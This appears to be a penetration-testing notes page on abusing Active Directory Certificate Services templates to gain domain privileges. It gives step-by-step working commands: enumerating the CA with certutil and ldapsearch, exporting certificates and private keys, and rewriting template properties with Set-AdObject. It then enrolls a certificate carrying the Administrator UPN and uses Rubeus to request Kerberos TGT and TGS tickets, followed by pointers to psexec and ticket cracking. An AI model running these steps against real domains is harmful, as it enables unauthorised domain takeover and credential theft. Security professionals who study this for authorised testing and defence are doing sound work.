---
description: Privilege escalation with Active Directory Certificate Services
---

# ADCS PrivEsc: Certificate Templates

## Enumeration

### Enumerating the ADCS from localhost

```bash
certutil -dump # dump general information
certutil -CA # infromation about the configured certificate authority
certutil -catemplates # list accessible templates
certutil -Template [<TemplateName>] # list rights on the templates or specifc template when specified
```

### Enumerating the ADCS from LDAP

It is also possible to enumerate the Active Directory Certificate Services \(ADCS\) from Linux or any platform that supports LDAP connectivity

```bash
ldapsearch -x -H 'ldap://10.10.10.10' -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local" -D 'DOAMIN\user' -w 'password!' # All information about the Public key services
ldapsearch -x -H 'ldap://10.10.10.10' -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local" -D 'DOAMIN\user' -w 'password!' # Information about the certificate templates
ldapsearch -x -H 'ldap://10.10.10.10' -b "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local" -D 'DOAMIN\user' -w 'password!' # information about the Certification Authorities
ldapsearch -x -H 'ldap://10.10.10.10' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local" -D 'DOAMIN\user' -w 'password!' # information about the Enrollment Services
```

### Enumerating certificate templates

```text
certutil -Template
certutil -Template <Template-Name>
```

When rights like `Allow Full Control` or `Allow Write` are granted for a user under your control, this will enable you to edit the specific certificate template. If the certificate template has `Allow Enroll` for your user\(group\) or you already obtain a certificate for another User Principal Name \(UPN\) it might be possible to escalate privileges or perform lateral movement.

> Allow Full Control also grants Allow Enroll rights

### Enumerating existing certificates

#### Listing

```text
get-childitem cert:\ # list storages
get-childitem cert:\localmachine\my
get-childitem cert:\currentuser\my
```

#### Extracting a certificate

```text
$cert = Get-ChildItem -Path cert:\CurrentUser\My\<Thumbprint>
Export-Certificate -Cert $cert -FilePath c:\test.cer
```

#### Extracting the private key from a certificate

```text
$pw = ConvertTo-SecureString "password1!" -AsPlainText -Force 
$certificate = Get-ChildItem -Path Cert:\CurrentUser\My\<Thumbprint>
Export-PfxCertificate -Cert $certificate -FilePath key.pfx -Password $pw
```

The extracted private key also can be used with Rubeus \(see [here](https://github.com/GhostPack/Rubeus)\)

### Enumerating the CA servers local policy

```text
certutil -getreg policy\editflags
```

If you find that `EDITF_ATTRIBUTESUBJECTALTNAME2` is set as a flag this allows anyone to set a User Principal Name \(UPN\) for any certificate template in the active directory \(you still might need to modify the template, if you are not able to request/enroll one\).

## Exploitation / Modification

### Abusing write access on a certificate template

#### Modifying the certificate template and setting the necessary properties

```text
$Properties = @{}
$Properties.Add('mspki-certificate-name-flag',1)
$Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
$Properties.Add('msPKI-Certificate-Application-Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
$Properties.Add('flags',0)
$Properties.Add('mspki-enrollment-flag',0)
$Properties.Add('mspki-private-key-flag',256) # 0x100
$Properties.'mspki-private-key-flag' += 16 # 0x10
$Properties.Add('pkidefaultkeyspec',1)
$Properties.Add('pKIDefaultCSPs','1,Microsoft RSA SChannel Cryptographic Provider')

Import-Module ActiveDirectory
Set-AdObject "CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace $Properties
```

**Information about the Properties**

* `mspki-certificate-name-flag` -&gt; specifies the subject name flags
  * `1` -&gt; instructs the client to supply subject information in the certificate request
* `pkiextendedkeyusage` -&gt; list of OIDs that represent the extended key usages
  * `1.3.6.1.4.1.311.20.2.2` -&gt; Microsoft Smart Card Logon
  * `1.3.6.1.5.5.7.3.2` -&gt; Client Authentication
* `msPKI-Certificate-Application-Policy` -&gt; application policy OID added to the certificate application policy extension
  * has to be the same as `pkiextendedkeyusage`
* `flags = 0` -&gt; general enrollment flags
  * `0` -&gt; no flags \(clear flags\)
* `mspki-enrollment-flag` -&gt; enrollment flags
  * `0` -&gt; no flags \(clear flags\)
* `mspki-private-key-flag`
  * `256` -&gt; instructs client to process the `msPKI-RA-Application-Policies` attribute
  * `+16` -&gt; instructs client to allow other applications to copy the private key to a `.pfx` file at a later time
* `pKIDefaultKeySpec`
  * `1` -&gt; Keys used to encrypt/decrypt session keys
* `pKIDefaultCSPs` -&gt; cryptographic service providers \(CSP\) used to create private and public key
  * `1,Microsoft RSA SChannel Cryptographic Provider`
    * `integer,` -&gt; priority for the CSP
    * `string` -&gt; CSP to use

> Properties like `pkiextendedkeyusage` and `msPKI-Certificate-Application-Policy` should be set as needed depending on the services configured on the CA. However either Client Authentication, Microsoft Smartcard Logon, Key Purpose Client Auth or Any Purpose have to be set, in order to escalate privileges. The corresponding OIDs are publicly available.

## Privilege escalation

Using a certificate to authenticate as a privileged principal with PKINIT. There are two ways to achieve this.

**The certificate**

* is configured on the target object as an **alternative security identity** \(Whatever that means; Not covered here\)
* **includes the User Principal Name** \(UPN\) of the target principal in the Subject Alternative Name extension

### Using the Subject Alternative Name

when escalating privileges with the UPN, we need \(to enroll\) a certificate with the `subject alternative name`set to our target.

#### Setting the subject alternative name and enrolling a certificate

**Powershell**

```text
# Create a com object and set the subject alternative name
$SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
$IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
$IAN = New-Object -ComObject X509Enrollment.CAlternativeName
$IAN.InitializeFromString(0xB,"Administrator") # UPN to use e.g. user@domain.local or user
$IANs.Add($IAN)
$SAN.InitializeEncode($IANs)

# Create a request object to request the certificate based on a template
$Request = New-Object -ComObject X509Enrollment.CX509Enrollment
$Request.InitializeFromTemplateName(0x1,"TemplateName") # Template to use
$Request.Request.X509Extensions.Add($SAN)
$Request.CertificateFriendlyName = "TemplateName" # Template to use

# Enroll the certificate
$Request.Enroll()
```

> this already should be configured to abuse `EDITF_ATTRIBUTESUBJECTALTNAME2` you need to modify `$IAN.InitializeFromString(0xB,"Administrator")` \(Not tested\)

**CertReq**

request.inf \([template](https://skanthak.homepage.t-online.de/certificate.html)\)

```text
[NewRequest]
Subject = "CN=ComputerName,CN=Computers,DC=domain,DC=local"
Exportable = TRUE
KeyLength = 2048
KeySpec = 1
KeyUsage = 0x60
MachineKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
[RequestAttributes]
CertificateTemplate=Web
SAN="upn=Administrator" ;or upn=Administrator@domain.local
[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=Administrator" ;or upn=Administrator@domain.local
[EnhancedKeyUsageExtension]
OID = 1.3.6.1.4.1.311.20.2.2
OID = 1.3.6.1.5.5.7.3.2
```

> to abuse `EDITF_ATTRIBUTESUBJECTALTNAME2` you need to modify `SAN="upn=Administrator"`

commands

```text
certreq -q -new request.inf request.pem
certreq -q -submit request.pem cert.pem
certreq -q -accept cert.pem
```

1. create a `-new` certificate request from given policy file
2. `-Submit` the generated `request.pem` to the certificate authority
3. `-Accept` and install the response of the certificate authority

#### Using an existing certificate

If you already have a certificate for another user you might be able to obtain a TGT for this user. However you need to manually check if the certificate fulfills the requirements from the exploitation step.

The `subject alternative name` can be extracted for a certificate from the current users store 

```c
$cert = get-childitem cert:\currentuser\my\<Thumbprint>
$sanExt = $cert.Extensions | Where-Object{$_.Oid.FriendlyName -eq "subject alternative name"}
$sanExt.Format(1)
```

```text
sample output: 

Other name:
    Principal Name=Administrator
```

or using openssl

```bash
openssl asn1parse -in test.cer -inform der # search for the OCTET STRING offset after :X509v3 Subject Alternative Name
openssl asn1parse -in test.cer -inform der -strparse <offset>
```

```text
sample output:

    0:d=0  hl=2 l=  31 cons: SEQUENCE          
    2:d=1  hl=2 l=  29 cons: cont [ 0 ]        
    4:d=2  hl=2 l=  10 prim: OBJECT            :Microsoft User Principal Name
   16:d=2  hl=2 l=  15 cons: cont [ 0 ]        
   18:d=3  hl=2 l=  13 prim: UTF8STRING        :Administrator
```

> when parsing certificates \(.cer\) with openssl you might need to inform openssl about the certificate format e.g. \(DER \| PEM\)

### Using Rubeues to escalate privileges with the certificate

Obtain a **Ticket Granting Ticket \(TGT\)** for the User Principal Name \(UPN\)

```text
Rubeus.exe asktgt /user:Administrator /certificate:<Thumbprint> /outfile:admin_tgt.kirbi
```

Obtain a **Ticket Granting Service \(TGS\)** for the obtained Ticket Granting Ticket \(TGT\)

```text
Rubeus.exe asktgs /ticket:admin_tgt.kirbi /service:SPN/some.domail.local /dc:dc.domain.local /outfile:admin_tgs.kirbi
```

### **Further things to do** \(get creative\)

* \*exec with the obtained TGS \(e.g. `psexec`\)
* crack the TGS \(because the NT hash of the user is included in this ticket\)
* convert the kirbi ticket to a ccache ticket \(e.g. when working on Linux\)
* use the service you obtained it for :---\)

## References

{% embed url="https://docs.microsoft.com/en-us/powershell/module/pki/?view=windowsserver2019-ps" caption="" %}

{% embed url="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/" %}

{% embed url="https://github.com/cfalta/PoshADCS" %}

{% embed url="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-crtd/4c6950e4-1dc2-4ae3-98c3-b8919bb73822" %}

{% embed url="https://github.com/GhostPack/Rubeus" %}

{% embed url="https://docs.microsoft.com/de-de/windows-server/administration/windows-commands/certreq\_1" %}



